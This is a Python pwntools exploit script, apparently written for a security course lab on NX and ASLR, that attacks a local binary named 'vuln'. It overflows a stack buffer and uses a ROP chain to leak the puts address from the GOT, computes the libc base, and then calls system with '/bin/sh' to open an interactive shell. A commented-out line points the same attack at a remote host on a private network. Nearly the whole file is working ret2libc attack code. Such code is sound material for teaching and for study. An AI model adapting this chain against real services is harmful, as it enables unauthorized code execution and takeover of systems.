from pwn import *

# attention, now PIE is a problem

#  with PIE
#   11c6:       e8 b5 fe ff ff          call   1080 <printf@plt>

#  no PIE
#  4011f0:       e8 7b fe ff ff          call   401070 <printf@plt>

############################# addreses #################################

elf = ELF("vuln")
libc = ELF("libc.so.6")
rop = ROP(elf)

print(rop.ret)
# objdump -d vuln 

#PUTS_GOT = 0x40401
#PUTS_PLT = 0x401060

PUTS_GOT = elf.got['puts']
PUTS_PLT = elf.plt['puts']

# ropper> search pop rdi
POP_RDI = rop.rdi.address

# gdb> p main
MAIN = elf.symbols["main"]

# objdump -T libc.so.6 | grep system 
# SYSTEM = 0x50ae0 
SYSTEM_OFFSET = libc.symbols["system"]
PUTS_OFFSET = libc.symbols["puts"]

# gdb> grep "/bin/sh"
# [+] In '/home/user/Desktop/VDSI/NX_ASLR/libc.so.6'(0x7f96fd0cd000-0x7f96fd125000), permission=r--
#  0x7f96fd0e8cba - 0x7f96fd0e8cc1  â†’   "/bin/sh"
# 0x00007f96fcf11000 0x00007f96fcf39000 0x0000000000000000 r-- /home/user/Desktop/VDSI/NX_ASLR/libc.so.6
# BINSH_OFFSET = 0x7f96fd0e8cba - 0x00007f96fcf11000
BINSH_OFFSET = next(libc.search(b"/bin/sh"))

RET = rop.ret.address

############################# exploit ##################################


# set environment LD_PRELOAD=/home/user/Desktop/VDSI/NX_ASLR/libc.so.6

gdb_commands = '''
# debug automatically breaks at _start - ignore it
b *vuln+73 

continue
'''

#context.log_level = "debug"

p = gdb.debug('./vuln', gdbscript=gdb_commands)
#p = remote("192.168.252.114", "42042")

######################### leak libc ############################


exploit = b""
exploit += p64(POP_RDI)
exploit += p64(PUTS_GOT)
exploit += p64(PUTS_PLT)
exploit += p64(MAIN)

#p.sendline(b"A"*96 + b"B"*8 + b"C"*8)
p.sendline(b"A"*96 + b"B"*8  + exploit)

print(p.recvuntil("No shell for you :(\n"))
print(p.recvline())
#p.interactive()


leak = u64(p.recvline().strip().ljust(8, b"\x00"))
print(hex(leak))

libc_base = leak - PUTS_OFFSET

print("leaked libc address: ", hex(libc_base))

######################### get shell ##############################

exploit = b""
exploit += p64(POP_RDI)
exploit += p64(libc_base + BINSH_OFFSET)
exploit += p64(RET)
exploit += p64(libc_base + SYSTEM_OFFSET)

p.send(b"A"*96 + b"B"*8 + exploit)

p.interactive()